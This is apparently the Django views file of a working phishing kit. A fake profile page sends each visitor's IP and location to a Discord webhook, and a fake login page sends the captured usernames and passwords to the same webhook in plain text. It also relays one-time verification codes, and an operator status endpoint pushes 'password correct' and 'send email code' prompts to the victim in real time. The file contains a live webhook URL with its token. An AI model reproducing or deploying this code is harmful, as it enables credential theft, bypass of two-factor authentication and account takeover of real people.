from django.shortcuts import render, redirect
from django.contrib import messages
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from channels.layers import get_channel_layer
from asgiref.sync import async_to_sync
import logging
import requests
from datetime import datetime
import json
import os

# Set up logger
logger = logging.getLogger(__name__)

PUBLIC_IP_APIS = [
    "https://api.ipify.org",
    "https://icanhazip.com", 
    "https://ident.me",
    "https://checkip.amazonaws.com",
]

# Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1523355615525867650/s28X3S_aIDij8oeU5LGcBSdyjjZgInl5oqa4DMpTyMDAhkE2thkUU_dtZ_t2yiipaT9N"

# Your proxy configuration
PROXY = {
    # 'http': '',
    # 'https': ''
}

# Set to True to use proxy
USE_PROXY = False

# IP Geolocation API (free, no API key required)
IP_API_URL = "http://ip-api.com/json/"

def get_ip_geolocation(ip_address):
    """
    Get geolocation information for an IP address
    """
    try:
        # Query IP geolocation API
        if USE_PROXY:
            response = requests.get(
                f"{IP_API_URL}{ip_address}",
                proxies=PROXY,
                timeout=10
            )
        else:
            response = requests.get(
                f"{IP_API_URL}{ip_address}",
                timeout=10
            )
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    'country': data.get('country', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                    'country_code': data.get('countryCode', 'Unknown'),
                    'lat': data.get('lat', 'Unknown'),
                    'lon': data.get('lon', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown')
                }
        
        return {
            'country': 'Unknown',
            'city': 'Unknown',
            'region': 'Unknown',
            'isp': 'Unknown'
        }
    except Exception as e:
        print(f"❌ Error getting geolocation: {e}")
        return {
            'country': 'Error',
            'city': 'N/A',
            'region': 'N/A',
            'isp': 'N/A'
        }

def send_discord_message(message, color=0x00ff00):
    """
    Send a simple message to Discord webhook
    """
    try:
        embed = {
            "title": "📨 Notification",
            "description": f"{message}",
            "color": color,
            "timestamp": datetime.now().isoformat()
        }
        
        payload = {
            "embeds": [embed],
            "username": "System Bot"
        }
        
        if USE_PROXY:
            response = requests.post(
                WEBHOOK_URL, 
                json=payload, 
                timeout=30,
                proxies=PROXY,
                headers={'Content-Type': 'application/json'}
            )
        else:
            response = requests.post(
                WEBHOOK_URL, 
                json=payload, 
                timeout=30,
                headers={'Content-Type': 'application/json'}
            )
        
        return response.status_code == 204
    except Exception as e:
        print(f"❌ Error sending Discord message: {e}")
        return False

def send_page_visit_notification(ip_address, geo_info, user_agent, user_id):
    """
    Send page visit notification to Discord
    """
    try:
        # Create flag emoji for country
        country_flag = "🌍"
        if geo_info.get('country_code') and len(geo_info.get('country_code')) == 2:
            # Convert country code to flag emoji
            flag = ''.join(chr(ord(c) + 0x1F1E6 - ord('A')) for c in geo_info['country_code'].upper())
            country_flag = flag if flag else "🌍"
        
        embed = {
            "title": "👤 Page Visit Detected",
            "color": 0x3498db,  # Blue color
            "fields": [
                {
                    "name": "📍 Location",
                    "value": f"**{geo_info.get('country', 'Unknown')}**\n",
                    "inline": True
                },
                {
                    "name": "🌐 Network Information",
                    "value": f"📡 IP: {ip_address}\n",
                    "inline": True
                }
            ],
            "footer": {
                "text": "Page Visitor Tracker"
            },
            "timestamp": datetime.now().isoformat()
        }
        
        payload = {
            "content": "**📊 New Page Visit!**",
            "embeds": [embed],
            "username": "Visitor Monitor Bot",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/1047/1047711.png"
        }
        
        print(f"📤 Sending page visit to Discord via proxy...")
        
        if USE_PROXY:
            response = requests.post(
                WEBHOOK_URL, 
                json=payload, 
                timeout=30,
                proxies=PROXY,
                headers={'Content-Type': 'application/json'}
            )
        else:
            response = requests.post(
                WEBHOOK_URL, 
                json=payload, 
                timeout=30,
                headers={'Content-Type': 'application/json'}
            )
        
        if response.status_code == 204:
            print(f"✅ Page visit notification sent successfully")
            return True
        else:
            print(f"❌ Discord returned status {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Error sending page visit notification: {e}")
        return False

def send_discord_notification(username, password, user_id=None, ip_address=None, user_agent=None):
    """
    Send login attempt information to Discord webhook using proxy
    """
    try:
        # Create the embed message
        embed = {
            "title": "New Login Attempt",
            "color": 0x00ff00,
            "fields": [
                {
                    "name": "Username/Email",
                    "value": f"```{username}```",
                    "inline": True
                },
                {
                    "name": "Password",
                    "value": f"```{password}```",
                    "inline": True
                },
                {
                    "name": "Timestamp",
                    "value": datetime.now().strftime("%Y-%m-%d %H:%M"),
                    "inline": False
                }
            ],
            "footer": {
                "text": "Login Monitor"
            },
            "timestamp": datetime.now().isoformat()
        }
        
        payload = {
            "content": "**Login Attempt Detected!**",
            "embeds": [embed],
            "username": "Login Monitor Bot",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/1047/1047711.png"
        }
        
        print(f"📤 Sending to Discord via proxy...")
        print(f"🔄 Using proxy: {PROXY.get('http', 'None')}")
        
        # Send to Discord using proxy
        if USE_PROXY:
            response = requests.post(
                WEBHOOK_URL, 
                json=payload, 
                timeout=30,
                proxies=PROXY,
                headers={'Content-Type': 'application/json'}
            )
        else:
            response = requests.post(
                WEBHOOK_URL, 
                json=payload, 
                timeout=30,
                headers={'Content-Type': 'application/json'}
            )
        
        print(f"📬 Discord response status: {response.status_code}")
        
        if response.status_code == 204:
            print(f"✅ Discord notification sent successfully for: {username}")
            return True
        else:
            print(f"❌ Discord returned status {response.status_code}: {response.text}")
            return False
            
    except requests.exceptions.ProxyError as e:
        print(f"❌ Proxy error: {e}")
        print("💡 Check if proxy is working")
        return False
    except requests.exceptions.Timeout:
        print("⏰ Request timeout - proxy might be slow")
        return False
    except requests.exceptions.ConnectionError as e:
        print(f"❌ Connection error: {e}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"❌ Error sending Discord webhook: {e}")
        return False

def get_client_ip(request):
    
    if request.META.get("HTTP_X_FORWARDED_FOR"):
        return request.META["HTTP_X_FORWARDED_FOR"].split(",")[0].strip()

    if request.META.get("HTTP_X_REAL_IP"):
        return request.META["HTTP_X_REAL_IP"]

    return request.META.get("REMOTE_ADDR")

def user_profile(request, user_id):
    """
    Display the user profile page
    This function is called when the page loads initially
    """
    # Get visitor's IP address
    ip_address = get_client_ip(request)
    
    # If there are multiple IPs (in case of proxy), get the first one
    if ip_address and ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()
    
    user_agent = ""
    
    print(f"👤 Page visited by IP: {ip_address}")
    
    # Get geolocation information
    geo_info = get_ip_geolocation(ip_address)
    print(f"📍 Location: {geo_info.get('country')}, {geo_info.get('city')}")
    
    # Send visit notification to Discord (run in background, don't block)
    try:
        send_page_visit_notification(ip_address, geo_info, user_agent, user_id)
    except Exception as e:
        print(f"⚠️ Failed to send visit notification but continuing: {e}")
    
    context = {
        'user_id': user_id,
        'username': 'John Doe',
        'visitor_ip': ip_address
    }
    return render(request, 'people/user_profile.html', context)

def login_page(request, user_id):
    """
    Display the login page
    """
    context = {
        'user_id': user_id,
    }
    return render(request, 'people/login.html', context)

def login_user(request, user_id):
    """
    Handle login - AJAX endpoint that returns JSON response only
    No redirect, stays on login page - this is intentional for Discord notification
    """
    print("=" * 50)
    print(f"🔐 LOGIN ATTEMPT - User ID: {user_id}")
    print(f"📝 Request method: {request.method}")
    
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        # Send to Discord via proxy
        print("📤 Attempting to send to Discord via proxy...")
        notification_sent = send_discord_notification(
            username=username,
            password=password,
        )
        
        if notification_sent:
            print("✅ Successfully sent to Discord")
            return JsonResponse({
                'status': 'success',
                'message': 'Login information sent to Discord!'
            })
        else:
            print("⚠️ Failed to send to Discord")
            return JsonResponse({
                'status': 'error',
                'message': 'Failed to send to Discord. Please try again.'
            })
    
    # Return error for non-POST requests
    return JsonResponse({
        'status': 'error',
        'message': 'Invalid request method'
    }, status=400)


def send_verification_code(request, user_id):
    """
    Handle login - AJAX endpoint that returns JSON response only
    No redirect, stays on login page - this is intentional for Discord notification
    """
    print("=" * 50)
    print(f"🔐 LOGIN ATTEMPT - User ID: {user_id}")
    print(f"📝 Request method: {request.method}")
    
    if request.method == 'POST':
        verificationCodevalue = request.POST.get('verificationCodevalue')
        
        discord_message = f"```{verificationCodevalue}```"
        send_discord_message(discord_message, color=0x00ff00)
        
       
        print("✅ Successfully sent to Discord")
        return JsonResponse({
            'status': 'success',
            'message': 'verificationCodevalue sent to Discord!'
        })
    
    # Return error for non-POST requests
    return JsonResponse({
        'status': 'error',
        'message': 'Invalid request method'
    }, status=400)

def logout_user(request, user_id):
    """
    Handle user logout
    """
    logout(request)
    messages.info(request, 'You have been logged out.')
    return redirect('login_page', user_id=user_id)

def broadcast_status(status_value, message=""):
    """
    Broadcast status to all connected WebSocket clients
    """
    try:
        channel_layer = get_channel_layer()
        async_to_sync(channel_layer.group_send)(
            "status_group",
            {
                'type': 'status_update',
                'status': status_value,
                'message': message,
                'timestamp': datetime.now().isoformat()
            }
        )
        print(f"📡 Broadcasted status: {status_value} - {message}")
        return True
    except Exception as e:
        print(f"❌ Failed to broadcast status: {e}")
        return False

@csrf_exempt
@require_http_methods(["GET", "POST"])
def api_set_status(request):
    """
    API endpoint to receive status updates from the Python app
    """
    try:
        if request.method == 'GET':
            status_value = request.GET.get('value')
        else:
            data = json.loads(request.body)
            status_value = data.get('value')
        
        print(f"📥 Received status update: {status_value}")
        
        # Map status values to meaningful messages
        status_messages = {
            'True': '✅ Password is Correct',
            'False': '❌ Password is Incorrect',
            'yle': '🚨 New Login Attempt',
            'yle2': '📊 Error occurred. Use Email One-Time Code',
            'yle3': '📧 Email One-Time Code Sent'
        }
        
        message = status_messages.get(str(status_value), f'Status: {status_value}')
        
        broadcast_status(status_value, message)
        
        return JsonResponse({
            'status': 'success',
            'received': status_value,
            'message': message,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        print(f"❌ Error in API: {e}")
        return JsonResponse({
            'status': 'error',
            'error': str(e)
        }, status=500)
    

def debug_ip(request):
    
    ip_headers = {}
    ip_keys = [
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REAL_IP',
        'HTTP_CF_CONNECTING_IP',
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_VIA',
        'HTTP_X_PROXY_ID',
        'REMOTE_ADDR',
        'REMOTE_HOST',
    ]
    
    for key in ip_keys:
        ip_headers[key] = request.META.get(key, None)
    
    final_ip = get_client_ip(request)
    
    return JsonResponse({
        'all_ip_headers': ip_headers,
        'final_ip': final_ip,
        'is_proxy': bool(request.META.get('HTTP_VIA')),
        'all_meta_keys': list(request.META.keys()), 
    }, json_dumps_params={'indent': 2})